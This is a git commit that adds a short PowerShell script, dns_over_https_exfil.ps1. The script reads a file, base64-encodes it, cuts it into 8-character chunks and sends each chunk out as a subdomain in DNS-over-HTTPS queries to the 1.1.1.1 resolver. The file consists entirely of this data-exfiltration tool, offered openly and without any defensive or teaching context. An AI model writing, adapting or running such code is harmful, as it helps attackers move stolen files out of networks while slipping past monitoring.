26c66fab5a4558fbd448553ebcdf1819f896c7ec
Bajok <bajok@mf.me>
2025-05-29 01:11:27 +0200

    Add files via upload

---
+++ dns_over_https_exfil.ps1
@@ -0,0 +1,33 @@
+﻿$originalfile = "path/to/file"
+
+$encoded = [Convert]::ToBase64String(
+  [System.Text.Encoding]::Unicode.GetBytes(
+    (Get-Content  $originalfile -Raw -Encoding UTF8)
+  )
+)
+$CharArray = $encoded -split '(.{8})' -ne ''
+
+Function dohq{
+
+ param (
+	[Parameter(Mandatory=$True)]
+	[String]$secret
+)
+	
+		$header = @{"accept"="application/dns-json"}
+		$response = (Invoke-WebRequest -Uri "https://1.1.1.1/dns-query?name=$secret.google.com" -Headers $header)
+	
+		if ($response.Content.GetType().name -eq "Byte[]") {
+			$json = [System.Text.Encoding]::UTF8.GetString($response.Content)
+		}
+		Else {
+			$json = $response.Content
+		}
+	
+		$content = $json | ConvertFrom-Json
+		$content.Answer
+}
+
+Foreach ($secret in $CharArray) {
+    dohq $secret
+}
